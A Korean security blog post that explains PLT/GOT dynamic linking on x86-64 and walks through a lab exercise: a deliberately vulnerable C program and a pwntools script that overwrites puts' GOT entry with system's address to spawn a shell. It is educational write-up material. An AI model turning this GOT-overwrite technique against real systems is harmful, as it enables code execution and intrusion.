<!DOCTYPE html> <html lang=" en "><head> <meta charset="utf-8" /> <title> PLT & GOT Overwrite in x86-64 - TouBVa </title> <meta http-equip="X-UA-Compatible" content="IE=edge" /> <meta name="viewport" content="width=device-width, initial-scale=1" /> <meta name="description" content="PLT를 이용한 GOT 값 덮어쓰기 실습- PLT & GOT Overwrite in x86-64"> <meta name="keywords" content="PLT & GOT Overwrite in x86-64, TouBVa, system_hacking, protostar,System Hacking, PLT, GOT, x86-64"/> <link rel="alternate" type="application/rss+xml" title="RSS" href="/feed.xml" /> <meta content="" property="fb:app_id" /> <meta content="TouBVa" property="og:site_name" /> <meta content="PLT & GOT Overwrite in x86-64" property="og:title" /> <meta content="article" property="og:type" /> <meta content="PLT를 이용한 GOT 값 덮어쓰기 실습" property="og:description" /> <meta content="http://localhost:4000/blog/system_hacking/plt-got-overwrite" property="og:url" /> <meta content="2022-12-21T11:15:23+09:00" property="article:published_time" /> <meta content="http://localhost:4000/about/" property="article:author" /> <meta content="http://localhost:4000/assets/img/posts/pltgot/Untitled.jpeg" property="og:image" /> <meta content="system_hacking" property="article:section" /> <!-- Twitter Cards --> <meta name="twitter:card" content="summary" /> <meta name="twitter:site" content="@" /> <meta name="twitter:creator" content="@" /> <meta name="twitter:title" content="PLT & GOT Overwrite in x86-64" /> <meta name="twitter:url" content="http://localhost:4000/blog/system_hacking/plt-got-overwrite" /> <meta name="twitter:description" content="PLT를 이용한 GOT 값 덮어쓰기 실습" /> <link rel="stylesheet" href="http://localhost:4000/assets/css/main.css" /> <!-- <link rel="stylesheet" href="http://localhost:4000/assets/css/custom-style.css" /> --> <link rel="stylesheet" href="http://localhost:4000/assets/bower_components/lightgallery/dist/css/lightgallery.min.css" /> <link rel="stylesheet" href="https://cdn.snipcart.com/themes/v3.0.0-beta.3/default/snipcart.css" /> <link rel="stylesheet" href="http://localhost:4000/assets/bower_components/bootstrap/dist/css/bootstrap.min.css" /> <link rel="stylesheet" href="http://localhost:4000/assets/bower_components/font-awesome/web-fonts-with-css/css/fontawesome-all.min.css" /> <link rel="stylesheet" href="http://localhost:4000/assets/bower_components/icono/dist/icono.min.css" /> <!-- Fonts--> <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet" /> <!-- Favicon --> <link rel="icon" href="http://localhost:4000/assets/img/favicon.ico" type="image/gif" sizes="16x16" /> <script> var base_url = 'http://localhost:4000' ; </script> <!-- Jquery --> <script src="https://code.jquery.com/jquery-3.4.1.min.js" integrity="sha384-vk5WoKIaW/vJyUAd9n/wmopsmNhiy+L2Z+SBxGYnUkunIxVxAv/UtMOhba/xskxh" crossorigin="anonymous" ></script> <!-- <script src="http://localhost:4000/assets/bower_components/jquery/dist/jquery.min.js"></script> --> <script src="http://localhost:4000/assets/bower_components/jquery.easing/jquery.easing.min.js"></script> <script src="http://localhost:4000/assets/bower_components/bootstrap/dist/js/bootstrap.bundle.min.js"></script> <script src="http://localhost:4000/assets/bower_components/jquery-mousewheel/jquery.mousewheel.min.js"></script> <script src="http://localhost:4000/assets/bower_components/ghosthunter/dist/jquery.ghostHunter.min.js"></script> <script src="http://localhost:4000/assets/bower_components/lightgallery/dist/js/lightgallery-all.min.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/picturefill/3.0.2/picturefill.min.js"></script> <script src="http://localhost:4000/assets/bower_components/imagesloaded/imagesloaded.pkgd.min.js"></script> <script src="http://localhost:4000/assets/bower_components/nanobar/nanobar.min.js"></script> <script src="http://localhost:4000/assets/bower_components/typewrite/dist/typewrite.min.js"></script> <script src="http://localhost:4000/assets/js/search.js"></script> <script src="http://localhost:4000/assets/js/on-scroll-progress.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.20.1/moment.min.js"></script> <script src="https://identity.netlify.com/v1/netlify-identity-widget.js"></script> <!-- for Mathjax support --> <script type="text/x-mathjax-config"> MathJax.Hub.Config({ TeX: { equationNumbers: { autoNumber: "AMS" } } }); </script> <script type="text/javascript" async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script> <!-- Github Button --> <script async defer src="https://buttons.github.io/buttons.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous" ></script> <!--[if lt IE 7]> <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]--> <!--[if IE 7]> <html class="no-js lt-ie9 lt-ie8"> <![endif]--> <!--[if IE 8]> <html class="no-js lt-ie9"> <![endif]--> <!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]--> </head> <body> <nav class="navbar navbar-expand-lg fixed-top navbar-dark" id="topNav"> <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation" > <span class="icono-hamburger" id="navbar-hamburger"> </span> </button> <a class="navbar-brand" href="/">TouBVa</a> <div class="collapse navbar-collapse" id="navbarNav"> <ul class="navbar-nav"> <li class="nav-item"> <a class="nav-link" href="http://localhost:4000/" >Home</a > </li> <li class="nav-item"> <a class="nav-link" href="http://localhost:4000/about" >About</a > </li> <li class="nav-item"> <a class="nav-link" href="http://localhost:4000/blog" >Blog</a > </li> <li class="nav-item"> <a class="nav-link" href="http://localhost:4000/contact" >Contact</a > </li> </ul> </div> <ul class="nav justify-content-end"> <li class="nav-item"> <a class="nav-link" href="http://localhost:4000/styleguide"> Styleguide </a> </li> <li class="nav-item"> <a class="nav-link toggle-search-button" href="#search"> <i class="fa fa-search search-icon" aria-hidden="true"></i> </a> </li> <li class="nav-item" style="margin-top:5px; padding-right:20px;" > <a class="header__checkout snipcart-checkout"> <svg width="31" height="27" viewBox="0 0 31 27" fill="none" xmlns="http://www.w3.org/2000/svg"> <path d="M1.10512 0.368718C0.560256 0.368718 0.118164 0.812066 0.118164 1.35848C0.118164 1.9049 0.560256 2.34824 1.10512 2.34824H4.90887L8.30138 18.4009C8.43503 19.0053 8.83085 19.5079 9.32946 19.5041H25.7788C26.3005 19.5118 26.7799 19.0375 26.7799 18.5143C26.7799 17.9911 26.3006 17.5168 25.7788 17.5245H10.1315L9.71003 15.545H27.095C27.5371 15.5412 27.9547 15.2048 28.0511 14.7718L30.354 4.87412C30.4825 4.29933 29.9852 3.67172 29.3979 3.66786H7.21171L6.6771 1.15221C6.58329 0.71276 6.15921 0.368652 5.7107 0.368652L1.10512 0.368718ZM7.623 5.64746H12.7634L13.2569 8.61674H8.25005L7.623 5.64746ZM14.7785 5.64746H20.9881L20.4946 8.61674H15.2719L14.7785 5.64746ZM23.0031 5.64746H28.1537L27.4649 8.61674H22.5097L23.0031 5.64746ZM8.67181 10.5963H13.5862L14.0797 13.5656H9.29919L8.67181 10.5963ZM15.6009 10.5963H20.1656L19.6721 13.5656H16.0944L15.6009 10.5963ZM22.1807 10.5963H27.0023L26.3135 13.5656H21.6872L22.1807 10.5963ZM12.6197 20.164C10.8141 20.164 9.32979 21.6525 9.32979 23.4632C9.32979 25.2739 10.8141 26.7624 12.6197 26.7624C14.4252 26.7624 15.9095 25.2739 15.9095 23.4632C15.9095 21.6525 14.4252 20.164 12.6197 20.164ZM22.4892 20.164C20.6837 20.164 19.1994 21.6525 19.1994 23.4632C19.1994 25.2739 20.6837 26.7624 22.4892 26.7624C24.2948 26.7624 25.7791 25.2739 25.7791 23.4632C25.7791 21.6525 24.2948 20.164 22.4892 20.164ZM12.6197 22.1435C13.3586 22.1435 13.9356 22.7222 13.9356 23.4632C13.9356 24.2042 13.3586 24.7829 12.6197 24.7829C11.8807 24.7829 11.3037 24.2042 11.3037 23.4632C11.3037 22.7222 11.8807 22.1435 12.6197 22.1435ZM22.4892 22.1435C23.2282 22.1435 23.8052 22.7222 23.8052 23.4632C23.8052 24.2042 23.2282 24.7829 22.4892 24.7829C21.7503 24.7829 21.1733 24.2042 21.1733 23.4632C21.1733 22.7222 21.7503 22.1435 22.4892 22.1435Z" fill="#ff7901" class="header__checkout-fill"></path> </svg> <span class="snipcart-items-count"></span> <!-- <span class="snipcart-total-price"></span> --> </a> </li> <!-- <li class="nav-item"> <input class="nav-link switch" id="theme-toggle" onclick="modeSwitcher()" type="checkbox" name="checkbox" /> </li> --> </ul> </nav> <div id="progress-bar"></div> <!-- Search Form --> <div class="search-form-container"> <form class="search-form"> <fieldset class="search-form__fieldset"> <div class="row"> <div class="col-lg-8 offset-md-2"> <input class="search-form__field" placeholder="Type to Search..." autofocus> <input class="search-form__submit" type="submit" value="search"> </div> </div> </fieldset> </form> <div class="row"> <div class="col-lg-8 offset-md-2 search-results"> <div class="card search-results"></div> </div> </div> <div class="close-search-button search-form-container__close"> <i class="fa fa-times icon"></i> </div> </div><div class="main-container"> <div class="row justify-content-center" id="blog-post-container"> <div class="col-lg-10"><article class="card" itemscope itemtype="http://schema.org/BlogPosting"> <div class="card-header"> <h1 class="post-title" itemprop="name headline">PLT & GOT Overwrite in x86-64</h1> <h4 class="post-meta">PLT를 이용한 GOT 값 덮어쓰기 실습</h4> <p class="post-summary"> Posted by : <span itemprop="author" itemscope itemtype="http://schema.org/Person"> <span itemprop="name"><a href="http://localhost:4000/blog/authors/TouBVa">TouBVa</a></span> </span > at <time datetime="2022-12-21 11:15:23 +0900" itemprop="datePublished" >Dec 21, 2022</time > </p> <span class="disqus-comment-count" data-disqus-identifier="/blog/system_hacking/plt-got-overwrite" ></span> <div class="post-categories"> Category : <a href="/blog/categories/system_hacking" >system_hacking</a > &nbsp; <a href="/blog/categories/protostar" >protostar</a > </div> </div> <div class="card-body" itemprop="articleBody"> <img class="card-img-top" src="http://localhost:4000/assets/img/posts/pltgot/Untitled.jpeg" alt="" /> <br /> <br /> <ul id="markdown-toc"> <li><a href="#0-pltgot란" id="markdown-toc-0-pltgot란">0. PLT&amp;GOT란?</a> <ul> <li><a href="#01-컴파일-시의-행위동적-라이브러리-참조" id="markdown-toc-01-컴파일-시의-행위동적-라이브러리-참조">0.1. 컴파일 시의 행위(동적 라이브러리 참조)</a></li> <li><a href="#02-파일-실행-시의-행위동적-라이브러리-참조" id="markdown-toc-02-파일-실행-시의-행위동적-라이브러리-참조">0.2. 파일 실행 시의 행위(동적 라이브러리 참조)</a></li> <li><a href="#03-정리" id="markdown-toc-03-정리">0.3. 정리</a></li> </ul> </li> <li><a href="#1-코드-정적-분석" id="markdown-toc-1-코드-정적-분석">1. 코드 정적 분석</a> <ul> <li><a href="#11-plt와-got-직접-따라가-보기" id="markdown-toc-11-plt와-got-직접-따라가-보기">1.1 plt와 got 직접 따라가 보기</a></li> <li><a href="#12-코드-정적-분석" id="markdown-toc-12-코드-정적-분석">1.2 코드 정적 분석</a></li> </ul> </li> <li><a href="#2-익스플로잇-설계" id="markdown-toc-2-익스플로잇-설계">2. 익스플로잇 설계</a></li> <li><a href="#3-익스플로잇" id="markdown-toc-3-익스플로잇">3. 익스플로잇</a></li> </ul> <p><br /></p> <h1 id="0-pltgot란">0. PLT&amp;GOT란?</h1> <p><a href="https://toubva.github.io/blog/protostar-stack5-x86-x64/#/">이전 포스트의 섹션 3</a> 에서 다루었던 요소가 있다. 바로 GCC 를 이용한 C 언어 소스 코드 컴파일 시, 파일 실행 시의 행위였다. 가볍게 해당 과정을 되살려보자. (정적 라이브러리 방식은 현재 주제와 관련 없으므로 쓰지 않았다)</p> <p><br /></p> <h2 id="01-컴파일-시의-행위동적-라이브러리-참조">0.1. 컴파일 시의 행위(동적 라이브러리 참조)</h2> <ol> <li>프로그램 컴파일 명령어를 보낸다.</li> <li>gcc는 링커를 트리거한다.</li> <li>링커는 어떤 컴파일러를 쓰는지, 소스에는 어떤 라이브러리가 명시되어 있는지 체크해 필요한 라이브러리를 찾아낸다. <ul> <li>이 때 라이브러리를 찾아내는 과정에서는 <code class="language-plaintext highlighter-rouge">Linker Name</code> 을 참고한다(.so 파일).</li> </ul> </li> <li>그리고 해당 라이브러리의 <code class="language-plaintext highlighter-rouge">soname</code> 을 읽어온다(.so.2.6 등의 버전 넘버).</li> <li>읽어온 <code class="language-plaintext highlighter-rouge">soname</code> 을 기준으로 라이브러리들을 파일에 연결시켜 컴파일한다.</li> </ol> <p><br /></p> <h2 id="02-파일-실행-시의-행위동적-라이브러리-참조">0.2. 파일 실행 시의 행위(동적 라이브러리 참조)</h2> <ol> <li>파일을 실행하면 <code class="language-plaintext highlighter-rouge">Dynamic Loader</code> 가 트리거된다.</li> <li>Dynamic Linking 된 공유 라이브러리들을 컴파일 단계에서 확보해 둔 <code class="language-plaintext highlighter-rouge">soname</code> 을 이용해 찾아 낸다.</li> <li>이후 찾아낸 라이브러리들을 해당 ELF 파일의 가상 메모리 섹션에 탑재한다. (리눅스의 경우 heap과 stack 사이에 라이브러리가 탑재되고 윈도우의 경우 스택의 엉덩이에 힙의 엉덩이가 맞붙어 있는.. 형태라… 애플리케이션이 탑재된 영역 아래에 커널 라이브러리 영역이 탑재된다)</li> </ol> <p><em><br /></em></p> <h2 id="03-정리">0.3. 정리</h2> <p>즉, 정적 라이브러리 방식으로 파일을 컴파일 및 실행하게 된다면 당연히 모든 라이브러리와 함수가 해당 소스 코드에 포함된 상태로 실행되므로 굳이 라이브러리에 명시된 함수의 주소를 알아오는 과정이 필요하지 않지만</p> <p><strong>동적 라이브러리 링킹 방식으로 파일을 컴파일하거나 실행</strong>할 때, 다양한 라이브러리 파일을 해당 소스 코드에 링킹하기 때문에 <strong>해당 라이브러리는 메모리의 어느 위치에 탑재되었는지, 그 라이브러리 내에 정의된 함수들은 어느 위치에 탑재되었는지</strong>에 관한 정보가 필수적이다.</p> <p>이런 식의 정보를 쉽게 알려주기 위해 <strong>plt와 got</strong>를 사용하게 되었다.</p> <p>위의 기능이 언제나 가능하도록 만들기 위해 <strong>“plt의 주소는 언제나 고정되어 있다”.</strong></p> <p><img src="/assets/img/posts/pltgot/Untitled.jpeg" alt="최초로 함수의 주소를 알아올 때 plt와 got의 행위를 나타낸 도식." /></p> <p>최초로 함수의 주소를 알아올 때 plt와 got의 행위를 나타낸 도식.</p> <ul> <li><strong>PLT(Procedure Linkage Table)</strong>는 현재 콜하려는 라이브러리상의 함수의 주소를 <strong>got의 어느 부분이 가리키는지</strong> 알고 있다. <ul> <li><code class="language-plaintext highlighter-rouge">jmp {rip-x(address)}</code> 포맷의 인스트럭션을 이용해 필요한 함수의 주소를 가지고 있는 got의 지점으로 포워딩해 준다.</li> </ul> </li> <li><strong>GOT(Global Offset Table)</strong>는 현재 콜하려는 라이브러리상의 <strong>함수의 주소를 정확히</strong> 알고 있다. <ul> <li>다만, got 상에서 처음으로 함수의 주소를 알아내려 할 때 당시에는 got에 해당 함수의 주소가 없다. <ul> <li>got를 이용해 해당 함수의 주소를 알아내려고 할 때가 되어서야 Linker가 dl_resolve라는 함수를 이용해 주소를 알아와서 넣어준다.</li> <li>따라서 첫 번째 접근 이후부터는 got에 항상 주소가 있게 된다.</li> </ul> </li> </ul> </li> </ul> <p>여기에서 중요한 건 <strong>“plt의 주소는 언제나 고정되어 있다”는 점이다. 이를 악용해 ASLR 우회가 가능</strong>하기 때문이다.</p> <p>차후 다른 포스팅에서 got 변조를 이용한 ASLR 우회를 다룰 계획이다.</p> <p><br /><br /></p> <h1 id="1-코드-정적-분석">1. 코드 정적 분석</h1> <p>먼저 주어진 문제 코드를 분석해 보자.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//got_overwrite.c</span>
<span class="c1">//gcc -o got_overwrite -no-pie</span>
<span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="n">puts_got</span><span class="o">=</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x601018</span><span class="p">;</span> <span class="c1">// puts_got</span>
	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">value</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"libc_system: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">system</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">"Overwrite puts_got"</span><span class="p">);</span>
	<span class="n">scanf</span><span class="p">(</span><span class="s">"%lx"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">value</span><span class="p">);</span>
	<span class="o">*</span><span class="n">puts_got</span><span class="o">=</span><span class="n">value</span><span class="p">;</span> <span class="c1">//overwrite puts_got</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p><br /></p> <h2 id="11-plt와-got-직접-따라가-보기">1.1 plt와 got 직접 따라가 보기</h2> <p><code class="language-plaintext highlighter-rouge">*puts_got</code> 의 초기화 값으로 로컬 환경에서 puts의 got 위치 주소를 직접 찾아다 넣어 줘야 한다.</p> <p>puts의 got 위치를 찾는 방법은 아래와 같다.</p> <p><img src="/assets/img/posts/pltgot/Untitled%201.jpeg" alt="Untitled" /></p> <p>pwndbg를 이용해 <code class="language-plaintext highlighter-rouge">disas main</code>을 하면, main+121지점에서 puts를 콜할 때 명시적 주소를 콜하는 것을 확인할 수 있다.</p> <p>이 때 0x400520에는 무엇이 있길래 그쪽으로 rip를 이동시켜 주는 걸까? 직접 알아보면 아래와 같은 결과를 볼 수 있다.</p> <p><img src="/assets/img/posts/pltgot/Untitled%202.jpeg" alt="Untitled" /></p> <p><strong>plt는 got의 특정 위치에 저장된 puts 함수의 주소로 rip를 포워딩</strong>해 주는 역할을 하고 있었다.</p> <p>인스트럭션에 의한다면 <code class="language-plaintext highlighter-rouge">0x400526+0x200af2 = 0x601018</code> 에 실제 puts 함수의 주소가 저장되어 있을 것이다.</p> <p>jmp 인스트럭션이 위치한 <code class="language-plaintext highlighter-rouge">0x400520</code> 이 아닌 바로 다음 인스트럭션의 주소인 <code class="language-plaintext highlighter-rouge">0x400526</code> 를 rip의 값으로 사용하는 이유는, 어떤 인스트럭션을 읽어 오기 위해 메모리에 접근하는 순간 pc, 즉 rip의 주소는 바로 다음 인스트럭션을 가리키게 되기 때문이다. 즉, 저 인스트럭션이 수행되는 순간의 rip는 저 인스트럭션 바로 다음 인스트럭션의 주소를 가리키고 있기 때문이다.</p> <p>해당 주소(<code class="language-plaintext highlighter-rouge">0x601018</code>)에 저장된 값을 확인해 보았다.</p> <p><img src="/assets/img/posts/pltgot/Untitled%203.jpeg" alt="Untitled" /></p> <p>got의 <code class="language-plaintext highlighter-rouge">0x601018</code> 지점에는 <code class="language-plaintext highlighter-rouge">0x400526</code>이 저장되어 있었고, <code class="language-plaintext highlighter-rouge">0x400526</code>으로 이동하면 <code class="language-plaintext highlighter-rouge">0x601010</code>으로 점프하게 되어 있다. <code class="language-plaintext highlighter-rouge">0x601010</code>은 <code class="language-plaintext highlighter-rouge">0x601018</code>과 값이 가깝기 때문에 아마 got의 일부분일 것으로 예상되어 <code class="language-plaintext highlighter-rouge">0x601010</code> 지점에 저장된 값 <code class="language-plaintext highlighter-rouge">0x7ffff7dea8f0</code> 주소의 인스트럭션을 확인해 보니 <code class="language-plaintext highlighter-rouge">dl_resolve</code> 계열의 함수임을 알 수 있었다.</p> <p><br /></p> <p>즉, got 는 결과적으로 puts 함수의 주소를 알아내기 위해 <code class="language-plaintext highlighter-rouge">dl_resolve</code> 계열의 함수를 호출한다는 것을 확인할 수 있었다. 해당 함수가 정확히 어떤 매커니즘으로 puts 함수의 주소를 알아내 리턴해주는지에 관해서는 <a href="https://rond-o.tistory.com/216#f61b16a1-7700-4283-826f-d6ba19990bf7">여기 블로그</a>가 정말 잘 설명해 두었으니 링크를 걸어둔다.</p> <p><br /></p> <p>어찌 되었든, puts를 찾기 위해 plt가 rip를 jmp 시키는 주소가 <code class="language-plaintext highlighter-rouge">0x601018</code> 임을 알았으니 주어진 코드의 puts_got 값을 로컬 환경에 맞게 고칠 수 있게 되었다.</p> <p><br /></p> <h2 id="12-코드-정적-분석">1.2 코드 정적 분석</h2> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//got_overwrite.c</span>
<span class="c1">//gcc -o got_overwrite -no-pie</span>
<span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="n">puts_got</span><span class="o">=</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x601018</span><span class="p">;</span> <span class="c1">// puts_got</span>
	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">value</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"libc_system: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">system</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">"Overwrite puts_got"</span><span class="p">);</span>
	<span class="n">scanf</span><span class="p">(</span><span class="s">"%lx"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">value</span><span class="p">);</span>
	<span class="o">*</span><span class="n">puts_got</span><span class="o">=</span><span class="n">value</span><span class="p">;</span> <span class="c1">//overwrite puts_got</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p>주어진 코드는 먼저 system 함수의 주소를 leak 해주고, 입력받은 값을 puts_got 변수 안에 있는 주소에 넣어주는 역할을 하고 있다.</p> <p>puts_got 자체가 got 테이블에 저장된 값을 변경하는 것이기 때문에, 우리는 마지막 줄에서 puts가 호출되는 시점에 엉뚱한 system 함수가 호출되도록 puts_got 변수에 system 함수의 주소를 넣어줘야 한다.</p> <p>또한 사용자에게 값을 받는 시점에 <code class="language-plaintext highlighter-rouge">%lx</code> 포맷 스트링을 사용하기 때문에 기본으로 8 바이트 값을 받는다고 생각하고 있어 패딩 걱정은 하지 않아도 좋을 것이다.</p> <p><br /><br /></p> <h1 id="2-익스플로잇-설계">2. 익스플로잇 설계</h1> <p>앞서 분석했던 점을 감안하면 익스플로잇이 해야 할 일은 다음과 같다.</p> <ul> <li>먼저 프로그램이 출력하는 시스템 함수의 주소를 받아 저장한다.</li> <li>저장했던 시스템 함수의 주소를 스트링 형식으로 입력한다. 애초에 포맷 스트링이 <code class="language-plaintext highlighter-rouge">%lx</code> 이므로 스트링으로 입력해 줘야 컴파일러가 알아서 hex 값으로 인식할 것이다.</li> </ul> <p><br /><br /></p> <h1 id="3-익스플로잇">3. 익스플로잇</h1> <p>익스플로잇 코드는 아래와 같다.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./got_overwrite"</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"0x"</span><span class="p">)</span>

<span class="n">libc_system</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_system</span><span class="o">&amp;</span><span class="mh">0x0000ffffffff</span><span class="p">)</span>

<span class="c1"># gdb.attach(p)
# raw_input("1")
</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div> <p>앞서 이야기한 것과 같이, plt의 주소는 고정되어 있기 때문에 ASLR을 켜도, ASLR을 꺼도 동일하게 익스플로잇에 성공할 수 있다.</p> <p>익스플로잇을 실행한 결과 아래와 같이 쉘을 딸 수 있었다.</p> <p><img src="/assets/img/posts/pltgot/Untitled%204.jpeg" alt="Untitled" /></p> <br /><!-- Load Facebook SDK for JavaScript --> <div id="fb-root"></div> <script> (function(d, s, id) { var js, fjs = d.getElementsByTagName(s)[0]; if (d.getElementById(id)) return; js = d.createElement(s); js.id = id; js.src = "https://connect.facebook.net/en_US/sdk.js#xfbml=1&version=v3.0"; fjs.parentNode.insertBefore(js, fjs); })(document, "script", "facebook-jssdk"); </script> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8" ></script> <div class="share-page"> <p class="share-text">Share this on &rarr;</p> <a href="https://twitter.com/share?ref_src=twsrc%5Etfw" class="twitter-share-button" data-size="large" data-show-count="false" style="margin-top:5px;" >Tweet</a > <a class="fb-share-button" data-href="http://localhost:4000/blog/system_hacking/plt-got-overwrite" data-size="large" data-layout="button" >Share</a> </div><!-- Author box --> <div class="card"> <div class="card-header"> About TouBVA </div> <div class="card-body"> <div class="row"> <div class="col-md-4"> <img class="author-profile-img" src="http://localhost:4000/assets/img/authors/toubva.jpeg" alt="TouBVA" /> </div> <div class="col-md-6"> <p class="author_bio">A Security Researcher, now concentrating on Security Consulting.</p> <p>Email : touBVa@gmail.com</p> <p>Website : https://toubva.github.io</p> <p class="profile-links"> <a class="social-link" href="https://github.com/TouBVa" target="_blank"><i class="fab fa-github fa-fw"></i></a> <a class="social-link" href="https://www.linkedin.com/in/johndoe" target="_blank"><i class="fab fa-linkedin fa-fw"></i></a> <a class="social-link" href="https://www.youtube.com/channel/UCSfLBFFfNU9r6ihfei6VeJw" target="_blank"><i class="fab fa-youtube fa-fw"></i></a> <a class="social-link" href="https://www.facebook.com/johndoe" target="_blank"><i class="fab fa-facebook fa-fw"></i></a> <a class="social-link" href="https://www.twitter.com/johndoe" target="_blank"><i class="fab fa-twitter fa-fw"></i></a> </p> </div> </div> </div> </div> </div><!-- Incomment incase you want to use Disqus <div id="disqus_thread"></div> --> </article> <div id="disqus_thread", style="width: 95%; margin-left: 3%;"><script> var disqus_config = function () { this.page.url = "http://localhost:4000/blog/system_hacking/plt-got-overwrite"; /* Replace PAGE_URL with your page's canonical URL variable */ this.page.identifier = "/blog/system_hacking/system-hacking-plt-got-overwrite"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */ }; (function () { /* DON'T EDIT BELOW THIS LINE */ var d = document, s = d.createElement('script'); s.src = 'https://toubva.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); </script> <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a> </noscript></div> </div> <div class="row"> <div class="col-md-4"> <div class="card"> <div class="card-header">About TouBVa</div> <div class="card-body"> <p class="author_bio">Welcome to my world!</p><!-- Place this tag where you want the github button to render. --> <a class="github-button" href="https://github.com/touBVa/touBVa.github.io" data-color-scheme="no-preference: dark; light: dark; dark: dark;" data-icon="octicon-star" data-size="large" data-show-count="true" aria-label="Star my blog on GitHub">Star</a> </div> </div> </div> <div class="col-md-4"> <div class="card"> <div class="card-header">Categories</div> <div class="card-body text-dark"> <div id="#dreamhack_system_hacking"></div> <li class="tag-head"> <a href="/blog/categories/dreamhack_system_hacking">dreamhack_system_hacking</a> </li> <a name="dreamhack_system_hacking"></a> <div id="#system_hacking"></div> <li class="tag-head"> <a href="/blog/categories/system_hacking">system_hacking</a> </li> <a name="system_hacking"></a> <div id="#protostar"></div> <li class="tag-head"> <a href="/blog/categories/protostar">protostar</a> </li> <a name="protostar"></a> <div id="#certification_study"></div> <li class="tag-head"> <a href="/blog/categories/certification_study">certification_study</a> </li> <a name="certification_study"></a> <div id="#paper_study"></div> <li class="tag-head"> <a href="/blog/categories/paper_study">paper_study</a> </li> <a name="paper_study"></a> <div id="#network_hacking"></div> <li class="tag-head"> <a href="/blog/categories/network_hacking">network_hacking</a> </li> <a name="network_hacking"></a> </div> </div> </div> <div class="col-md-4"> <div class="card"> <div class="card-header">Useful Links</div> <div class="card-body text-dark"> <li> <a href="http://localhost:4000/">Home</a> </li> <li> <a href="http://localhost:4000/about">About</a> </li> <li> <a href="http://localhost:4000/blog">Blog</a> </li> <li> <a href="http://localhost:4000/contact">Contact</a> </li> </div> </div> </div> </div> </div> </div> <div class="col-lg-12" id="newsletter_footer"><!-- Mailchimp Newletters --> <form action=""method="post" id="mc-embedded-subscribe-form" name="mc-embedded-subscribe-form" class="validate" target="_blank" novalidate> <div id="mc_embed_signup_scroll_footer"> <label for="mce-EMAIL_footer"> Signup for Weekly Email Newsletters :D</label> <input type="email" value="" name="EMAIL" class="email" id="mce-EMAIL_footer" placeholder="email address" required> <!-- real people should not fill this in and expect good things - do not remove this or risk form bot signups--> <div style="position: absolute; left: -5000px;" aria-hidden="true"> <input type="text" name="b_50bab1c85eae24ecfb0f68361_3a2dd721d0" tabindex="-1" value=""> </div><br /> <div class="clear"> <input type="submit" value="Subscribe" name="subscribe" 